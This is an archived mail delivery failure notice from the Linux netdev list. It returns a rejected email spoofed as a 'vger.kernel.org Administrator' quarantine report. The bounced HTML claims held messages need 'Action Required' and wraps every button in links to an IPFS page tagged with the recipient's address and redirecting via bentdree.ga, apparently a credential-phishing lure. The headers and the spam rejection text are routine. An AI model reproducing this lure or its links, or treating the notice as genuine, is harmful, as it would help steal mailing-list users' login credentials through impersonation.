Return-Path: <netdev+bounces-28357-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [IPv6:2604:1380:45d1:ec00::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 45ED177F2CC
	for <lists+netdev@lfdr.de>; Thu, 17 Aug 2023 11:09:32 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 72E281C20F65
	for <lists+netdev@lfdr.de>; Thu, 17 Aug 2023 09:09:31 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id B78E2100B3;
	Thu, 17 Aug 2023 09:09:28 +0000 (UTC)
X-Original-To: netdev@vger.kernel.org
Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A83AD100A9
	for <netdev@vger.kernel.org>; Thu, 17 Aug 2023 09:09:28 +0000 (UTC)
Received: from chg.server2.ideacentral.com (unknown [108.163.232.234])
	by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 963B0271B
	for <netdev@vger.kernel.org>; Thu, 17 Aug 2023 02:09:27 -0700 (PDT)
Received: from mailnull by ns-196.awsdns-24.com with local (Exim 4.96)
	id 1qWZ0Q-001HVg-3A
	for netdev@vger.kernel.org;
	Thu, 17 Aug 2023 04:09:27 -0500
X-Failed-Recipients: netdev@vger.kernel.org
Auto-Submitted: auto-replied
From: Mail Delivery System <Mailer-Daemon@ns-196.awsdns-24.com>
To: netdev@vger.kernel.org
References: <20230817100924.49044D6518A44C49@vger.kernel.org>
Content-Type: multipart/report; report-type=delivery-status; boundary=1692263366-eximdsn-494131582
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Subject: Mail delivery failed: returning message to sender
Message-Id: <E1qWZ0Q-001HVg-3A@ns-196.awsdns-24.com>
Date: Thu, 17 Aug 2023 04:09:26 -0500
X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
X-AntiAbuse: Primary Hostname - ns-196.awsdns-24.com
X-AntiAbuse: Original Domain - vger.kernel.org
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - 
X-Get-Message-Sender-Via: ns-196.awsdns-24.com: sender_ident via received_protocol == local: mailnull/primary_hostname/system user
X-Authenticated-Sender: ns-196.awsdns-24.com: mailnull
X-Spam-Status: No, score=3.0 required=5.0 tests=BAYES_50,HTML_MESSAGE,
	MAY_BE_FORGED,RCVD_IN_DNSWL_BLOCKED,RCVD_IN_MSPIKE_BL,
	RCVD_IN_MSPIKE_L3,SPF_HELO_NONE autolearn=no autolearn_force=no
	version=3.4.6
X-Spam-Level: ***
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
	lindbergh.monkeyblade.net

--1692263366-eximdsn-494131582
Content-type: text/plain; charset=us-ascii

This message was created automatically by mail delivery software.

A message that you sent could not be delivered to one or more of its
recipients. This is a permanent error. The following address(es) failed:

  netdev@vger.kernel.org
    host vger.kernel.org [23.128.96.18]
    SMTP error from remote mail server after end of data:
    550 5.7.1 Spamassassin considers this message SPAM. In case you disagree, send the ENTIRE message (preferably as a saved attachment) plus this error message to <postmaster@vger.kernel.org>

--1692263366-eximdsn-494131582
Content-type: message/delivery-status

Reporting-MTA: dns; ns-196.awsdns-24.com

Action: failed
Final-Recipient: rfc822;netdev@vger.kernel.org
Status: 5.0.0
Remote-MTA: dns; vger.kernel.org
Diagnostic-Code: smtp; 550 5.7.1 Spamassassin considers this message SPAM. In case you disagree, send the ENTIRE message (preferably as a saved attachment) plus this error message to <postmaster@vger.kernel.org>

--1692263366-eximdsn-494131582
Content-type: message/rfc822

Return-path: <netdev@vger.kernel.org>
Received: from v-104-153-108-120.unman-vds.premium-chicago.nfoservers.com ([104.153.108.120]:62135)
	by ns-196.awsdns-24.com with esmtpsa  (TLS1.3) tls TLS_AES_256_GCM_SHA384
	(Exim 4.96)
	(envelope-from <netdev@vger.kernel.org>)
	id 1qWZ0Q-001HEN-1i
	for netdev@vger.kernel.org;
	Thu, 17 Aug 2023 04:09:25 -0500
From: vger.kernel.orgAdministrator<netdev@vger.kernel.org>
To: netdev@vger.kernel.org
Subject: =?UTF-8?B?IOKaoO+4jyBXQVJOSU5HOlNvbWUgRW1haWxzIENvdWxkIG5vdCBiZSBkZWxpdmVyZWQg?=
Date: 17 Aug 2023 10:09:25 +0100
Message-ID: <20230817100924.49044D6518A44C49@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html>

<html><head><title></title>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19003">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body><span style=3D"background-color: rgb(204, 204, 204);"><b><i><font col=
or=3D"#ff0000">Some Emails Could not be Delivered , Action Required</font><=
/i></b>.</span><div><br><font color=3D"#3d85c6"><font size=3D"4"><b>Quarant=
ined Messages Report</b> </font>&nbsp;</font><br>netdev@vger.kernel.org<div=
>17-08-2023, 08:00AM <br>&nbsp;<br>Dear netdev,</div><div><br>
4 messages addressed to you are currently on hold awaiting your further act=
ion. You can release all of your held messages and permit or block future e=
mails from the senders, or manage messages individually.<br><br>
<a href=3D"https://ipfs.io/ipfs/Qmak1oxePK5rUrFTQbZYckBAUWmRGbcFJkycxN8DaPa=
nxX?clientID=3Dnetdev@vger.kernel.org" target=3D"_blank" data-saferedirectu=
rl=3D"https://www.google.com/url?q=3Dhttps://bentdree.ga/%23%5B%5B-Email-%5=
D%5D&amp;source=3Dgmail&amp;ust=3D1620160588649000&amp;usg=3DAFQjCNFFwLZWfJ=
X-xB2LHrk7CvessvAOsg">Review all</a>
&nbsp; &nbsp;<a href=3D"https://ipfs.io/ipfs/Qmak1oxePK5rUrFTQbZYckBAUWmRGb=
cFJkycxN8DaPanxX?clientID=3Dnetdev@vger.kernel.org" target=3D"_blank" data-=
saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://bentdree.ga/%23%5=
B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1620160588649000&amp;usg=3DA=
FQjCNFFwLZWfJX-xB2LHrk7CvessvAOsg">Release all</a>
&nbsp; &nbsp; <a href=3D"https://ipfs.io/ipfs/Qmak1oxePK5rUrFTQbZYckBAUWmRG=
bcFJkycxN8DaPanxX?clientID=3Dnetdev@vger.kernel.org" target=3D"_blank" data=
-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://bentdree.ga/%23%=
5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1620160588649000&amp;usg=3D=
AFQjCNFFwLZWfJX-xB2LHrk7CvessvAOsg">Block all</a><br><br>Further Informatio=
n: <br>
To view your entire quarantine inbox or manage your preferences, <a href=3D=
"https://ipfs.io/ipfs/Qmak1oxePK5rUrFTQbZYckBAUWmRGbcFJkycxN8DaPanxX?client=
ID=3Dnetdev@vger.kernel.org" target=3D"_blank" data-saferedirecturl=3D"http=
s://www.google.com/url?q=3Dhttps://bentdree.ga/%23%5B%5B-Email-%5D%5D&amp;s=
ource=3Dgmail&amp;ust=3D1620160588649000&amp;usg=3DAFQjCNFFwLZWfJX-xB2LHrk7=
CvessvAOsg">Click Here</a><br><br>The system generated this notice on 17-08=
-2023, at 09:00AM<br>Do not reply to this automated message.<br>
&copy; 2023 vger.kernel.org. All rights reserved.</div></div>
</body></html>

--1692263366-eximdsn-494131582--

